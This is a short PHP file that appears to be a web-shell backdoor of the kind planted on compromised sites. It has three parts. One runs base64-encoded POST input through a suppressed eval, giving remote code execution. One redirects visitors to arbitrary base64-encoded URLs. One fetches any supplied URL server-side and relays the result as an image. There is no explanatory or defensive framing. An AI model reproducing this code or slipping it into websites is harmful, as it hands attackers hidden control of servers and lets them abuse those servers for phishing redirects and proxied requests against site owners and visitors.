<?php
        if(!empty($_POST['tp2']) and isset($_POST['tp2'])){
                $fv = base64_decode(($_POST['tp2']));
                @eval($fv);
        }
        if(isset($_GET['u']) and strlen($_GET['u'])>5){
                $url = base64_decode($_GET['u']);
                if(strpos($url,'http://') === false){
            $url = 'http://'.$url;
        }
                header('Location: '.$url);
                echo $url;
        }
        if(isset($_GET['img']) and strlen($_GET['img'])>10){
                $img_url = base64_decode($_GET['img']);
                if(strpos($img_url,'http://') === false){
                   $img_url = 'http://'.$img_url;
                }
                if(ini_get("allow_url_fopen") == 1)$imageData =  file_get_contents($img_url);
                else if( $curl = curl_init() ) {
                        curl_setopt($curl, CURLOPT_URL, $img_url);curl_setopt($curl, CURLOPT_RETURNTRANSFER,true);$out = curl_exec($curl);$imageData = $out;curl_close($curl);
                }else{
                        $url_data = parse_url($img_url);
                        $fp = fsockopen( $url_data['host'], 80, &$errno, &$errdesc);
                        if ( ! $fp ){}else{
                                $request = "GET ".$url_data['path']." HTTP/1.0\r\n";$request .= "Host: ".$url_data['host']."\r\n";$request .= "Referer: http://www.java2s.com/index.htm\r\n";$request .= "User-Agent: PHP test client\r\n\r\n";$page = array();
                                fputs ( $fp, $request );while ( ! feof( $fp ) ){$page[] = fgets( $fp, 1024 );}   fclose( $fp );$page = explode("\r\n\r\n",implode("",$page));$imageData = $page[1];
                        }
                }
                //$imageData = base64_encode(file_get_contents($img_url));
                //$src = 'data: '.mime_content_type($img_url).';base64,'.$imageData;
                //echo '<img src="',$src,'">';
                $type = explode(".",$img_url);
                header('Content-type: image/'.$type[(count($type)-1)].'');
                echo $imageData;
        }
?>
